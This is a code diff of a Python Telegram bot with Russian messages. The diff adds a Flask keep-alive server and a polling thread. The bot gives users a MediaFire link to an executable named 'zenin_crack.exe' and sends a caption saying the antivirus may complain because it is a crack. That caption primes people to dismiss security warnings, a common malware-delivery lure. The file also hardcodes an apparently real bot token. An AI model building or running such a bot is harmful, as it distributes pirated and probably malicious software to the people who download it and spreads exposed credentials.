@@ -1,19 +1,19 @@
+import os
+import threading
+import time
+from flask import Flask
 import telebot
 from telebot import types
-import time
 
 TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
-SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
-
-# ПРЯМАЯ ССЫЛКА НА ИЗОБРАЖЕНИЕ (замените на свою)
+SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/zenin_crack.exe/file"
 IMAGE_URL = "https://i.ibb.co/vxLfXLY4/gg.png"
 
 bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
 
-# Словарь для хранения времени последнего запроса пользователя
 user_last_use = {}
 
-# Проверка КД (5 секунд)
 def check_cooldown(user_id):
     current_time = time.time()
     if user_id in user_last_use:
@@ -22,7 +22,6 @@ def check_cooldown(user_id):
             return int(5 - time_passed)
     return 0
 
-# Обновление времени последнего действия
 def update_cooldown(user_id):
     user_last_use[user_id] = time.time()
 
@@ -32,10 +31,7 @@ def start(message):
     remaining = check_cooldown(user_id)
     
     if remaining > 0:
-        bot.send_message(
-            message.chat.id,
-            f"⏳ Подожди {remaining} секунд перед повторным использованием /start!"
-        )
+        bot.send_message(message.chat.id, f"⏳ Подожди {remaining} секунд!")
         return
     
     update_cooldown(user_id)
@@ -53,26 +49,42 @@ def callback(call):
     remaining = check_cooldown(user_id)
     
     if remaining > 0:
-        bot.answer_callback_query(
-            call.id,
-            f"⏳ Подожди {remaining} сек перед следующим запросом!",
-            show_alert=False
-        )
+        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=False)
         return
     
     update_cooldown(user_id)
     
     if call.data == "download":
-        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
-    
+        bot.send_message(call.message.chat.id, f"🔗 Ссылка:\n{SOFT_LINK}")
     elif call.data == "more":
-        bot.send_photo(
-            call.message.chat.id,
-            IMAGE_URL,
-            caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️"
-        )
+        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
     
     bot.answer_callback_query(call.id)
 
-print("✅ Бот запущен! КД 5 секунд на /start и кнопки")
-bot.infinity_polling()
+@app.route('/')
+def index():
+    return "Bot is running!"
+
+@app.route('/healthz')
+def health():
+    return "OK"
+
+def run_bot():
+    try:
+        # Удаляем webhook перед запуском polling
+        bot.remove_webhook()
+        time.sleep(1)
+        print("✅ Webhook удалён, запускаем polling...")
+        bot.infinity_polling()
+    except Exception as e:
+        print(f"Ошибка: {e}")
+        time.sleep(5)
+        run_bot()
+
+if __name__ == "__main__":
+    # Запускаем бота в отдельном потоке
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.start()
+    
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
